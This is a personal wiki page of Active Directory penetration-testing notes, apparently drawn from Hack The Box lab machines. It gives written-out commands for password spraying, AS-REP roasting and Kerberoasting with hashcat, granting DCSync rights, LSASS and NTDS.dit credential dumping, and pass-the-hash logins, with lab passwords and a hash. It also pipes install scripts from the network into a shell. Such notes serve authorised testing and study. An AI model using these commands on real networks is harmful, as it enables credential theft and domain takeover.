---
layout: wiki
title: Internals - Active Directory Resources
cate1: Internal
cate2: Active Directory
description: Notes about Active Directory
keywords: Internals
---

# Cheat Sheets
**[Wadcoms](https://wadcoms.github.io/)**

# Initial Enumeration (without credentials)
**[Password Spraying via Sprayhound](https://github.com/Hackndo/sprayhound)**
  - Checks badpwdcount attribute only in the domain policy

**[Rid Brute via SMB](https://medium.com/@e.escalante.jr/active-directory-workshop-brute-forcing-the-domain-server-using-crackmapexec-pt-6-feab1c43d970)**

**Requires:** Guest read access to IPC$ (Remote IPC) SMB File Share 
```
nxc smb 10.10.10.192 -u 'guest' -p '' --rid-brute > sid.txt
cat sid.txt | awk -F': ' '{print $2}' | awk '{print $1}' | sed 's/BLACKFIELD\\//' > users.txt
GetNPUsers.py BLACKFIELD/ -usersfile users.txt -format hashcat
hashcat -m 18200 creds.txt /usr/share/wordlists/rockyou.txt
```

**[LDAPSearch Cheat Sheet](https://notes.benheater.com/books/active-directory/page/ldapsearch)**
```
Domain Contexts: ldapsearch -x -H ldap://BLACKFIELD -s base namingcontexts
Search Users: ldapsearch -x -H ldap://BLACKFIELD -D 'CN=support,CN=users,DC=BLACKFIELD,DC=local' -W -b 'DC=BLACKFIELD,DC=local' '(objectClass=user)'
```

**[Share Enumeration]**
```
nxc smb [IP] --shares
```
Other resources
  - [Useful LDAP queries](https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/)

**[Bad PDF](https://github.com/deepzec/Bad-Pdf)**

# Initial Enumeration (with credentials - may also include other enumeration techniques from above)
**[Impacket]**
  - GetADUsers.py

**[LDAP Domain Dump via Linux](https://github.com/dirkjanm/ldapdomaindump)**

Old tool however useful if Bloodhound.py isn't working as intended.

**[Integrated DNS Dump](https://github.com/dirkjanm/adidnsdump)**

Any user in Active Directory can enumerate all DNS records in the Domain or Forest DNS zones, similar to a zone transfer.

Additional Resources:
  - [ADIDNS Dump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

**[BloodHound CE](https://github.com/SpecterOps/BloodHound)**

**Additional Resources** 
  - [BloodHound Community Edition](https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose)
  - [BloodHound Cypher Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
    
```
curl -L https://ghst.ly/getbhce | docker compose -f - up
```

**[BloodHound.py for Linux](https://github.com/dirkjanm/BloodHound.py)**
**Additional Resources**
  - [BloodHound.py for Bloodhound CE version](https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce)
```
python3 bloodhound.py -u "support" -p "#00^BlackKnight" -c ALL -d BLACKFIELD.local -ns 10.10.10.192 -dc dc01.BLACKFIELD.local
proxychains bloodhound-python -u "web_svc"  -d 'painters.htb' -dc 'dc.painters.htb' --dns-tcp -c ALL -v -ns 192.168.110.55 [proxychains equivalent]
```

# Poisoning and Relay
**[Responder](https://github.com/lgandx/Responder)**
  - IPv6/IPv4 LLMNR/NBT-NS/mDNS Poisoner and NTLMv1/2 Relay.

```
hashcat -m 5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt
/opt/tools/Responder/ (location of Responder)
```

**[SMB Relay]**
```
nxc smb [IP] --gen-relay-list relay.txt
```

# Active Directory Exploitation
**[ASREPRoasting via Impacket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)**

**[WriteDACL - BloodHound](https://support.bloodhoundenterprise.io/hc/en-us/articles/17312765477787-WriteDacl)**

**[Abusing Active Directory ACLs/ACEs](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)**

**[NTLMRelay](https://www.thehacker.recipes/ad/movement/ntlm/relay)**

**[DCSync - secretsdump](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)**

**With PowerView**:
```
whoami /all
Add-ADGroupMember -Identity "Exchange Windows Permissions" -members svc-alfresco
net group "Exchange Windows Permissions" /add svc-alfresco
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
Add-ObjectACL -PrincipalIdentity test123 -Credential $cred -Rights DCSync
Get-DomainUser -Identity svc-alfresco
Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | Where-Object { $_.IdentityReference -match "svc-alfresco" }
```

**[SYSVOL Group Policy Credential Mining](https://adsecurity.org/?p=2288)**

**[Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)**

**Requires:** Domain Credentials

**Targets:** Service Accounts with SPNs registered on the domain to retrieve TGS tickets containing the SPN hashes.

```
GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
```

## Lateral Movement
[ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword)

**Requires:** `GenericAll`, `AllExtendedRights` or `User-Force-Change-Password` on Object

```
net rpc password AUDIT2020 -U BLACKFIELD\\support -S BLACKFIELD.local (prompts new password)
```

## Credential Dumping
**[LSASS Dump - lsass.DMP](https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf)**

**Requires:** Credential Guard to be disabled.

```
Dumping LSASS via Linux: https://medium.com/@offsecdeer/dumping-lsass-remotely-from-linux-efc47391e56d
```

**[Dumping Local SAM](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-hashes-from-sam-registry)**
  - Crack SAM hashes: https://sanjumalhotra26.medium.com/dumping-credentials-from-sam-file-using-mimikatz-and-cracking-with-john-the-ripper-and-hashcat-ce5bbf2f4f5a

**[Pypykatz - Mimikatz for Linux](https://github.com/skelsec/pypykatz)**

**Requires:** A DMP file containing credentials extracted to our Linux machine.
```
pypykatz lsa minidump lsass.DMP
```

## Domain Escalation
**[Backup Operator - Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators)**
```
whoami /all (SeBackupPrivilege Enabled)

diskshadow /s backup.txt
robocopy /b E:\Windows\ntds . ntds.dit (NTDS file)
reg save hklm\system c:\temp\system.bak (System Hive keys)

## Other Resources
https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#ac58
```

-----------------------------------------------------------------------

## Active Directory Tools
**[NetExec](https://github.com/Pennyw0rth/NetExec)**
```
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh (install Rust)
source $HOME/.cargo/env
pipx install git+https://github.com/Pennyw0rth/NetExec
```

**[PowerView (Deprecated since 2021)](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)**
```. .\powerview.ps1```

**NSE**
```--script smb-os-discovery,smb-enum-shares,smb-enum-users,smb-vuln*```

**SMB**
Enum4Linux
SMBMap
smbclient
smbclient.py (Impacket)
**[NetExec - Cheatsheet](https://github.com/BlWasp/NetExec-Cheatsheet)**
**[SMB Enumeration Cheatsheet](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)**

**WinRM**
**[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)**
```
evil-winrm -i 10.10.10.192 -u "svc_backup" -H "9658d1d1dcd9250115e2205d9f48400d"
```

**[Impacket]()**
```
python3 -m pipx install impacket
  - **PSExec**
    - Shell access via SMB shares (Pass the Hash) 
  - **GetNPUsers**
    - Kerberos Pre-authentication disabled (ASREPRoasting)
```

## Resources
 - [The Hacker Recipes](https://www.thehacker.recipes/)
 - [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
